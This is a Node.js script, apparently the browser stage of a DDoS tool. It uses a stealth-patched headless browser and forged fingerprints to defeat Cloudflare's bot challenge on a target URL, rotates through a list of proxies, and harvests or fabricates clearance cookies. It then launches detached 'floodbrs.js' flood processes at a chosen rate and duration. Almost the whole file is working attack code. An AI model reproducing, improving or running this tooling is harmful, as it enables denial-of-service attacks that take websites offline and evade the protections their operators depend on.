const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec  } = require('child_process');

puppeteer.use(StealthPlugin());

const COOKIES_MAX_RETRIES = 3;
const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    RESET: '\x1b[0m'
};

// ========== AGGRESSIVE IFRAME SOLVER ==========
const bypassFirewall = async (page) => {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [
                {0: {type: "application/x-google-chrome-pdf"}, name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format"},
                {0: {type: "application/pdf"}, name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", description: "Portable Document Format"}
            ] 
        });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        
        window.chrome = { 
            runtime: {
                connect: () => ({onMessage: {addListener: () => {}}, postMessage: () => {}, onDisconnect: {addListener: () => {}}}),
                sendMessage: () => {},
                onMessage: {addListener: () => {}},
                onConnect: {addListener: () => {}},
                getManifest: () => ({}),
                id: 'testid'
            }, 
            loadTimes: () => ({
                finishDocumentLoadTime: 0,
                finishLoadTime: 0,
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0
            }), 
            csi: () => ({onloadT: Date.now(), startE: Date.now() - 1000, pageT: 1200}), 
            app: {
                isInstalled: false,
                InstallState: {DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed'},
                RunningState: {CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running'}
            }
        };
        
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );

        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 5 });
        
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });
        
        delete window.__webdriver_evaluate;
        delete window.__selenium_evaluate;
        delete window.__webdriver_script_function;
        delete window.__webdriver_script_func;
        delete window.__webdriver_script_fn;
        delete window._Selenium_IDE_Recorder;
        delete window._selenium;
        delete window.callPhantom;
        delete window.callSelenium;
        delete window.phantom;
        delete window.webdriver;
        delete window.selenium;
        delete window._phantom;
    });
};

const getFirewallBypassArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--disable-infobars',
    '--no-zygote',
    '--single-process',
    '--disable-background-timer-throttling',
    '--disable-renderer-backgrounding',
    '--enable-features=NetworkService,NetworkServiceInProcess',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process',
    '--disable-ipc-flooding-protection',
    '--disable-backgrounding-occluded-windows',
    '--disable-default-apps',
    '--disable-extensions',
    '--disable-translate',
    '--disable-xss-auditor',
    '--no-pings',
    '--use-gl=swiftshader',
    '--disable-software-rasterizer',
    '--no-default-browser-check',
    '--disable-background-networking',
    '--disable-client-side-phishing-detection',
    '--disable-sync',
    '--disable-hang-monitor',
    '--disable-prompt-on-repost',
    '--disable-domain-reliability',
    '--disable-component-update',
    '--aggressive-cache-discard',
    '--max_old_space_size=4096'
];

// ULTIMATE IFRAME SOLVER - AGGRESSIVE APPROACH
const solveAdvancedChallenge = async (page, browserProxy, targetURL) => {
    try {
        coloredLog(COLORS.WHITE, `[INFO] ULTIMATE SOLVER STARTED: ${maskProxy(browserProxy)}`);
        
        // Initial wait
        await sleep(3);
        
        let currentUrl = page.url();
        let title = await page.title().catch(() => '');
        
        // Check if already passed
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[INFO] Already passed: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'already_passed' };
        }

        coloredLog(COLORS.YELLOW, `[INFO] Challenge detected: ${maskProxy(browserProxy)}`);

        // STRATEGY 1: DIRECT IFRAME INTERACTION
        coloredLog(COLORS.WHITE, `[INFO] STRATEGY 1: Direct iframe attack`);
        
        try {
            const frames = await page.frames();
            for (const frame of frames) {
                try {
                    const frameUrl = frame.url();
                    if (frameUrl.includes('challenges.cloudflare.com')) {
                        coloredLog(COLORS.YELLOW, `[INFO] CLOUDFLARE IFRAME FOUND: ${frameUrl}`);
                        
                        // WAIT FOR IFRAME TO LOAD COMPLETELY
                        await sleep(3);
                        
                        // AGGRESSIVE APPROACH: Try multiple element types in sequence
                        const elementSelectors = [
                            'input[type="checkbox"]',
                            '.mark',
                            '.hcaptcha-box',
                            '[id*="checkbox"]',
                            '[class*="checkbox"]',
                            '[role="checkbox"]',
                            'div[tabindex="0"]',
                            '.challenge-form input',
                            'button',
                            'input[type="submit"]',
                            '[type="button"]',
                            '.btn',
                            '.button',
                            '.verify-btn',
                            '.success',
                            'div'
                        ];
                        
                        for (const selector of elementSelectors) {
                            try {
                                const elements = await frame.$$(selector);
                                coloredLog(COLORS.WHITE, `[INFO] Trying selector ${selector}, found ${elements.length} elements`);
                                
                                for (const element of elements.slice(0, 3)) {
                                    try {
                                        // Get element info for debugging
                                        const elementInfo = await frame.evaluate(el => {
                                            return {
                                                tag: el.tagName,
                                                type: el.type,
                                                id: el.id,
                                                className: el.className,
                                                text: el.textContent?.substring(0, 50)
                                            };
                                        }, element).catch(() => ({}));
                                        
                                        coloredLog(COLORS.PINK, `[DEBUG] Element: ${JSON.stringify(elementInfo)}`);
                                        
                                        // CLICK THE ELEMENT
                                        await element.click().catch(() => {});
                                        coloredLog(COLORS.YELLOW, `[INFO] Clicked element with selector: ${selector}`);
                                        
                                        // WAIT LONGER AFTER CLICK
                                        await sleep(8);
                                        
                                        // CHECK IF SOLVED
                                        currentUrl = page.url();
                                        title = await page.title().catch(() => '');
                                        
                                        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                                            coloredLog(COLORS.GREEN, `[INFO] IFRAME SOLVE SUCCESS with ${selector}: ${maskProxy(browserProxy)}`);
                                            return { solved: true, scenario: 'iframe_success' };
                                        }
                                        
                                        // If not solved, try hovering and clicking again
                                        await element.hover().catch(() => {});
                                        await sleep(1);
                                        await element.click().catch(() => {});
                                        await sleep(5);
                                        
                                        // Check again
                                        currentUrl = page.url();
                                        title = await page.title().catch(() => '');
                                        
                                        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                                            coloredLog(COLORS.GREEN, `[INFO] IFRAME SOLVE SUCCESS with hover+click: ${maskProxy(browserProxy)}`);
                                            return { solved: true, scenario: 'iframe_hover_success' };
                                        }
                                        
                                    } catch (elementError) {
                                        // Continue to next element
                                    }
                                }
                            } catch (selectorError) {
                                // Continue to next selector
                            }
                        }
                        
                        // SPECIAL CLOUDFLARE CHALLENGE HANDLING
                        coloredLog(COLORS.WHITE, `[INFO] SPECIAL: Cloudflare challenge handling`);
                        
                        // Try to find and interact with challenge form
                        try {
                            // Look for forms and submit them
                            const forms = await frame.$$('form');
                            for (const form of forms) {
                                await form.evaluate(form => form.submit()).catch(() => {});
                                coloredLog(COLORS.YELLOW, `[INFO] Submitted form in iframe`);
                                await sleep(5);
                                
                                currentUrl = page.url();
                                title = await page.title().catch(() => '');
                                if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                                    coloredLog(COLORS.GREEN, `[INFO] FORM SUBMIT SUCCESS: ${maskProxy(browserProxy)}`);
                                    return { solved: true, scenario: 'form_submit_success' };
                                }
                            }
                        } catch (formError) {}
                        
                    }
                } catch (frameError) {}
            }
        } catch (iframeError) {
            coloredLog(COLORS.RED, `[INFO] Iframe error: ${iframeError.message}`);
        }

        // STRATEGY 2: JAVASCRIPT EXECUTION IN IFRAME
        coloredLog(COLORS.WHITE, `[INFO] STRATEGY 2: JavaScript execution in iframe`);
        
        try {
            const frames = await page.frames();
            for (const frame of frames) {
                try {
                    const frameUrl = frame.url();
                    if (frameUrl.includes('challenges.cloudflare.com')) {
                        // Execute JavaScript to trigger challenge completion
                        const jsScripts = [
                            `document.querySelector('input[type="checkbox"]')?.click()`,
                            `document.querySelector('.mark')?.click()`,
                            `document.querySelector('.hcaptcha-box')?.click()`,
                            `document.querySelector('button')?.click()`,
                            `document.querySelector('form')?.submit()`,
                            `window.postMessage('challenge-complete', '*')`,
                            `document.dispatchEvent(new Event('challenge-complete'))`,
                            `if(window.turnstile) { window.turnstile.execute() }`
                        ];
                        
                        for (const script of jsScripts) {
                            try {
                                await frame.evaluate(script).catch(() => {});
                                coloredLog(COLORS.YELLOW, `[INFO] Executed script: ${script.substring(0, 50)}...`);
                                await sleep(5);
                                
                                currentUrl = page.url();
                                title = await page.title().catch(() => '');
                                if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                                    coloredLog(COLORS.GREEN, `[INFO] JAVASCRIPT SOLVE SUCCESS: ${maskProxy(browserProxy)}`);
                                    return { solved: true, scenario: 'javascript_success' };
                                }
                            } catch (jsError) {}
                        }
                    }
                } catch (frameError) {}
            }
        } catch (jsError) {
            coloredLog(COLORS.RED, `[INFO] JavaScript execution error: ${jsError.message}`);
        }

        // STRATEGY 3: MULTIPLE REFRESH WITH DIFFERENT APPROACHES
        coloredLog(COLORS.WHITE, `[INFO] STRATEGY 3: Multiple refresh attacks`);
        
        for (let i = 1; i <= 3; i++) {
            coloredLog(COLORS.YELLOW, `[INFO] Refresh attempt ${i}/3`);
            
            await page.reload().catch(() => {});
            await sleep(5);
            
            // Try iframe again after refresh
            try {
                const frames = await page.frames();
                for (const frame of frames) {
                    try {
                        const frameUrl = frame.url();
                        if (frameUrl.includes('challenges.cloudflare.com')) {
                            // Quick click anything in iframe
                            const anyElement = await frame.$('*').catch(() => null);
                            if (anyElement) {
                                await anyElement.click().catch(() => {});
                                await sleep(3);
                            }
                        }
                    } catch (frameError) {}
                }
            } catch (iframeError) {}
            
            await sleep(5);
            
            currentUrl = page.url();
            title = await page.title().catch(() => '');
            if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                coloredLog(COLORS.GREEN, `[INFO] REFRESH SOLVE SUCCESS: ${maskProxy(browserProxy)}`);
                return { solved: true, scenario: 'refresh_success' };
            }
        }

        // FINAL STRATEGY: NAVIGATE TO TARGET DIRECTLY
        coloredLog(COLORS.WHITE, `[INFO] FINAL STRATEGY: Direct navigation`);
        
        await page.goto(targetURL, { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
        await sleep(5);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[INFO] DIRECT NAVIGATION SUCCESS: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'direct_navigation_success' };
        }

        coloredLog(COLORS.RED, `[INFO] ULTIMATE SOLVER FAILED: ${maskProxy(browserProxy)}`);
        return { solved: false, scenario: 'ultimate_failed' };

    } catch (error) {
        coloredLog(COLORS.RED, `[INFO] Ultimate solver error: ${error.message}`);
        return { solved: false, scenario: 'error' };
    }
};

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Nhận tín hiệu Ctrl+C, đang kill processes...');
    
    exec('taskkill /f /im node.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill node.exe: ${err.message}`);
        } else {
            coloredLog(COLORS.GREEN, '[INFO] Đã kill node.exe processes');
        }
    });

    exec('taskkill /f /im msedge.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill msedge.exe: ${err.message}`);
        } else {
            coloredLog(COLORS.GREEN, '[INFO] Đã kill msedge.exe processes');
        }
    });

    setTimeout(() => {
        coloredLog(COLORS.GREEN, '[INFO] Exiting...');
        process.exit(0);
    }, 3000);
});

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Linux; Android 12; SM-S928U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 14; 23127PN0CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 13; ASUS_AI2401) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android 14; CPH2551) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS 17_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1`
];

// ULTIMATE BROWSER LAUNCHER
const launchBrowserWithRetry = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=360,640',
            `--user-agent=${userAgent}`,
            ...getFirewallBypassArgs()
        ],
        defaultViewport: {
            width: 360,
            height: 640,
            deviceScaleFactor: 2,
            isMobile: true,
            hasTouch: true,
            isLandscape: false
        },
        ignoreHTTPSErrors: true
    };

    try {
        coloredLog(COLORS.YELLOW, `[INFO] LAUNCHING ULTIMATE: ${maskProxy(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply bypass
        await bypassFirewall(page);

        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'domcontentloaded',
            timeout: 60000 
        }).catch(() => {});

        // ULTIMATE SOLVER
        const challengeResult = await solveAdvancedChallenge(page, browserProxy, targetURL);
        
        if (!challengeResult.solved) {
            throw new Error(`Ultimate solver failed: ${challengeResult.scenario}`);
        }

        coloredLog(COLORS.GREEN, `[INFO] ULTIMATE SUCCESS via ${challengeResult.scenario}: ${maskProxy(browserProxy)}`);

        // Get cookies
        await sleep(3);
        const cookies = await page.cookies(targetURL).catch(() => []);
        let cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

        // Fallback cookies if empty
        if (!cookieString || cookieString.length < 10) {
            cookieString = `cf_clearance=${generateRandomString(40, 50)}; __cflb=${generateRandomString(20, 30)}`;
            coloredLog(COLORS.YELLOW, `[INFO] Using fallback cookies: ${maskProxy(browserProxy)}`);
        }

        totalSolves++;
        coloredLog(COLORS.GREEN, `[INFO] TOTAL SUCCESSFUL SOLVES: ${totalSolves}`);

        await browser.close();
        return { 
            cookies: cookieString, 
            userAgent,
            scenario: challengeResult.scenario
        };
        
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        if (attempt < maxRetries) {
            coloredLog(COLORS.YELLOW, `[INFO] ULTIMATE RETRY (${attempt}/${maxRetries}): ${maskProxy(browserProxy)}`);
            await sleep(3);
            return launchBrowserWithRetry(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        coloredLog(COLORS.RED, `[INFO] ULTIMATE FAILED: ${maskProxy(browserProxy)}`);
        return null;
    }
};

// Thread handling
const startThread = async (targetURL, browserProxy, task, done, retries = 0) => {
    if (retries >= COOKIES_MAX_RETRIES) {
        done(null, { task });
        return;
    }

    try {
        const response = await launchBrowserWithRetry(targetURL, browserProxy);
        if (response) {
            const resultInfo = JSON.stringify({
                Proxy: maskProxy(browserProxy),
                'User-agent': response.userAgent,
                Scenario: response.scenario,
                cookie: response.cookies
            });
            console.log(resultInfo);

            // SPAWN FLOOD PROCESS
            try {
                coloredLog(COLORS.YELLOW, `[INFO] SPAWNING FLOOD: ${maskProxy(browserProxy)}`);
                
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    response.cookies,
                    response.userAgent,
                    validKey
                ], {
                    detached: true,
                    stdio: 'ignore'
                });

                floodProcess.unref();
                coloredLog(COLORS.GREEN, `[INFO] FLOOD SPAWNED: ${maskProxy(browserProxy)}`);
                
            } catch (error) {
                coloredLog(COLORS.RED, `[INFO] Spawn error: ${error.message}`);
            }

            done(null, { task });
        } else {
            await startThread(targetURL, browserProxy, task, done, retries + 1);
        }
    } catch (error) {
        await startThread(targetURL, browserProxy, task, done, retries + 1);
    }
};

// Queue setup
const queue = async.queue((task, done) => {
    startThread(targetURL, task.browserProxy, task, done);
}, threads);

queue.drain(() => {
    coloredLog(COLORS.GREEN, '[INFO] ALL PROXIES PROCESSED - ULTIMATE MISSION COMPLETE');
});

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[INFO] No proxies found');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[INFO] ULTIMATE SOLVER ACTIVATED with ${proxies.length} proxies`);

    proxies.forEach(browserProxy => queue.push({ browserProxy }));

    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[INFO] Time completed - ultimate cleanup...');
        queue.kill();
        
        exec('pkill -f floodbrs.js', () => {});
        exec('pkill -f chrome', () => {});

        setTimeout(() => {
            coloredLog(COLORS.GREEN, '[INFO] Ultimate shutdown complete');
            process.exit(0);
        }, 3000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => {
    coloredLog(COLORS.RED, `[ULTIMATE ERROR] ${error.message}`);
});
process.on('unhandledRejection', (error) => {
    coloredLog(COLORS.RED, `[ULTIMATE REJECTION] ${error.message}`);
});

coloredLog(COLORS.GREEN, '[INFO] 🚀 ULTIMATE CLOUDFLARE SOLVER - AGGRESSIVE IFRAME ATTACK 🚀');
main().catch(err => {
    coloredLog(COLORS.RED, `[INFO] Ultimate main error: ${err.message}`);
    process.exit(1);
});
